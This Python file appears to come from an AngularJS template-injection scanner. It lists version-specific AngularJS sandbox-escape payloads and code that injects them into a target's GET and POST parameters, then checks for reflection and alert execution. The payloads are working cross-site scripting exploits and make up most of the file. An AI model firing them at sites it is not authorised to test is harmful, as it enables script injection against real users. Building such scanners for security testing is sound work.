# -*- coding: utf-8 -*-

# MIT License
# 
# Copyright (c) 2017 Tijme Gommers
# 
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
# 
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
# 
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

from urllib.parse import urlparse, urlencode, parse_qs, quote_plus
from urllib.request import urlopen
from bs4 import BeautifulSoup
from acstis.Selenium import Selenium

import copy
import requests

class Exploit:

    payloads = [
        {
            "min": "1.0.1",
            "max": "1.1.5",
            "value": "{{constructor.constructor('alert(1)')()}}"
        },
        {
            "min": "1.2.0",
            "max": "1.2.1",
            "value": "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}"
        },
        {
            "min": "1.2.2",
            "max": "1.2.5",
            "value": "{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval(\"x='\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\"'\");}}"
        },
        {
            "min": "1.2.6",
            "max": "1.2.18",
            "value": "{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}"
        },
        {
            "min": "1.2.19",
            "max": "1.2.23",
            "value": "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;[\"a\",\"alert(1)\"].sort(toString.constructor);}}"
        },
        {
            "min": "1.2.24",
            "max": "1.2.29",
            "value": "{{'a'.constructor.prototype.charAt=''.valueOf;$eval(\"x='\\\"+(y='if(!window\\\\u002ex)alert(window\\\\u002ex=1)')+eval(y)+\\\"'\");}}"
        },
        {
            "min": "1.3.0",
            "max": "1.3.0",
            "value": "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//');}}"
        },
        {
            "min": "1.3.1",
            "max": "1.3.2",
            "value": "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//');}}"
        },
        {
            "min": "1.3.3",
            "max": "1.3.18",
            "value": "{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join;'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)//');}}"
        },
        {
            "min": "1.3.19",
            "max": "1.3.19",
            "value": "{{'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join;$eval('x=alert(1)//');}}"
        },
        {
            "min": "1.3.20",
            "max": "1.3.20",
            "value": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}"
        },
        {
            "min": "1.4.0",
            "max": "1.4.9",
            "value": "{{'a'.constructor.prototype.charAt=[].join;$eval('x=1}}};alert(1)//');}}"
        },
        {
            "min": "1.5.0",
            "max": "1.5.8",
            "value": "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}"
        },
        {
            "min": "1.5.9",
            "max": "1.5.11",
            "value": "{{ c=''.sub.call;b=''.sub.bind;a=''.sub.apply; c.$apply=$apply;c.$eval=b;op=$root.$$phase; $root.$$phase=null;od=$root.$digest;$root.$digest=({}).toString; C=c.$apply(c);$root.$$phase=op;$root.$digest=od; B=C(b,c,b);$evalAsync(\" astNode=pop();astNode.type='UnaryExpression'; astNode.operator='(window.X?void0:(window.X=true,alert(1)))+'; astNode.argument={type:'Identifier',name:'foo'}; \"); m1=B($$asyncQueue.pop().expression,null,$root); m2=B(C,null,m1);[].push.apply=m2;a=''.sub; $eval('a(b.c)');[].push.apply=a; }}"
        },
        {
            "min": "1.6.0",
            "max": "1.6.1",
            "value": "{{[].pop.constructor('alert(1)')()}}"
        }
    ]

    @staticmethod
    def is_vulnerable(queue_item, version, use_javascript_engine=False):

        get_params = Exploit.get_params(queue_item.request.url)
        post_params = queue_item.request.data if queue_item.request.data else []

        for param in get_params:
            for payload in Exploit.get_payloads(version):
                payload_params = copy.deepcopy(get_params)
                del payload_params[param]
                payload_params = urlencode(payload_params, doseq=True)

                host_url = queue_item.request.url.split('?')[0]
                full_url = host_url + "?" + payload_params

                if len(payload_params) > 0:
                    full_url = full_url + "&"

                full_urls = [
                    full_url + param + "=" + payload["value"],
                    full_url + param + "=" + quote_plus(payload["value"])
                ]

                for full_url in full_urls:
                    response = Exploit.make_request(full_url, queue_item.request.method, queue_item.request.data, queue_item.request.cookies, [])

                    if not Exploit.is_reflected(response.text, payload):
                        continue

                    if not Exploit.in_angular_scope(response.text, payload):
                        continue

                    vulnerable_item = copy.deepcopy(queue_item)
                    vulnerable_item.request.url = full_url

                    if use_javascript_engine and not Selenium.alert_is_popped(vulnerable_item):
                        continue
                        
                    return vulnerable_item

        for param in post_params:
            for payload in Exploit.get_payloads(version):
                payload_params = copy.deepcopy(post_params)
                del payload_params[param]

                datas = [
                    payload["value"],
                    quote_plus(payload["value"])
                ]

                for data in datas:
                    payload_params[param] = data
                    response = Exploit.make_request(queue_item.request.url, queue_item.request.method, payload_params, queue_item.request.cookies, [])

                    if not Exploit.is_reflected(response.text, payload):
                        continue

                    if not Exploit.in_angular_scope(response.text, payload):
                        continue

                    vulnerable_item = copy.deepcopy(queue_item)
                    vulnerable_item.request.data = payload_params

                    if use_javascript_engine and not Selenium.alert_is_popped(vulnerable_item):
                        continue

                    return vulnerable_item

        return False

    @staticmethod
    def get_params(url):
        parsed = urlparse(url)
        return parse_qs(parsed.query)

    @staticmethod
    def get_payloads(version):
        requested_payloads = []

        for payload in Exploit.payloads:
            req_major, req_minor, req_patch = version.split(".")
            min_major, min_minor, min_patch = payload["min"].split(".")
            max_major, max_minor, max_patch = payload["max"].split(".")

            if int(req_major) > int(max_major) or int(req_major) < int(min_major):
                continue

            if int(req_minor) > int(max_minor) or int(req_minor) < int(min_minor):
                continue

            if int(req_patch) > int(max_patch) or int(req_patch) < int(min_patch):
                continue

            requested_payloads.append(payload)

        return requested_payloads

    @staticmethod
    def make_request(url, method, data, cookies, headers):
        request_by_method = getattr(requests, method)
        return request_by_method(
            url=url, 
            data=data, 
            cookies=cookies, 
            headers=headers,
            allow_redirects=True,
            stream=True
        )

    @staticmethod
    def is_reflected(contents, payload):
        return payload['value'] in contents

    @staticmethod
    def in_angular_scope(contents, payload):
        soup = BeautifulSoup(contents, "html.parser")
        ng_app_contents = str(soup.select("[ng-app]"))

        return payload['value'] in ng_app_contents